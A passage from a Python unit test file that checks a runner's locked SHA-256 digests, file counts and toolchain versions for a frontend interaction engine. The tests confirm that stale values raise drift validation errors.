            )

    def test_frozen_engine_identity_locks_are_exact_and_stale_values_rejected(
        self,
    ) -> None:
        identity = runner.locked_interaction_engine_implementation_identity()
        self.assertEqual(
            (
                identity["source_tree"]["file_count"],
                identity["source_tree"]["digest"],
            ),
            (
                runner.LOCKED_INTERACTION_ENGINE_SOURCE_TREE_FILE_COUNT,
                runner.LOCKED_INTERACTION_ENGINE_SOURCE_TREE_SHA256,
            ),
        )
        self.assertEqual(
            (
                identity["dist_tree"]["file_count"],
                identity["dist_tree"]["digest"],
            ),
            (
                runner.LOCKED_INTERACTION_ENGINE_DIST_TREE_FILE_COUNT,
                runner.LOCKED_INTERACTION_ENGINE_DIST_TREE_SHA256,
            ),
        )
        self.assertEqual(
            {
                key: value["sha256"]
                for key, value in identity["files"].items()
            },
            runner.LOCKED_INTERACTION_ENGINE_FILE_SHA256,
        )

        stale_tree_locks = {
            "LOCKED_INTERACTION_ENGINE_SOURCE_TREE_FILE_COUNT": (
                runner.LOCKED_INTERACTION_ENGINE_SOURCE_TREE_FILE_COUNT + 1
            ),
            "LOCKED_INTERACTION_ENGINE_SOURCE_TREE_SHA256": "sha256:" + "0" * 64,
            "LOCKED_INTERACTION_ENGINE_DIST_TREE_FILE_COUNT": (
                runner.LOCKED_INTERACTION_ENGINE_DIST_TREE_FILE_COUNT + 1
            ),
            "LOCKED_INTERACTION_ENGINE_DIST_TREE_SHA256": "sha256:" + "0" * 64,
        }
        for lock_name, stale_value in stale_tree_locks.items():
            with (
                self.subTest(lock_name=lock_name),
                patch.object(runner, lock_name, stale_value),
                self.assertRaisesRegex(
                    runner.ValidationError, "tree identity drift"
                ),
            ):
                runner.locked_interaction_engine_implementation_identity()

        for key in runner.LOCKED_INTERACTION_ENGINE_FILE_SHA256:
            stale_files = dict(runner.LOCKED_INTERACTION_ENGINE_FILE_SHA256)
            stale_files[key] = "sha256:" + "0" * 64
            with (
                self.subTest(file_lock=key),
                patch.object(
                    runner, "LOCKED_INTERACTION_ENGINE_FILE_SHA256", stale_files
                ),
                self.assertRaisesRegex(
                    runner.ValidationError,
                    rf"frontend interaction engine {key} drift",
                ),
            ):
                runner.locked_interaction_engine_implementation_identity()

        with (
            patch.object(
                runner,
                "LOCKED_INTERACTION_ENGINE_NODE_SHA256",
                "sha256:" + "0" * 64,
            ),
            self.assertRaisesRegex(runner.ValidationError, "Node digest drift"),
        ):
            runner.locked_interaction_engine_implementation_identity()
        with (
            patch.object(
                runner, "LOCKED_INTERACTION_ENGINE_TYPESCRIPT_VERSION", "0.0.0"
            ),
            self.assertRaisesRegex(runner.ValidationError, "TypeScript drift"),
        ):
            runner.locked_interaction_engine_implementation_identity()


if __name__ == "__main__":
    unittest.main()
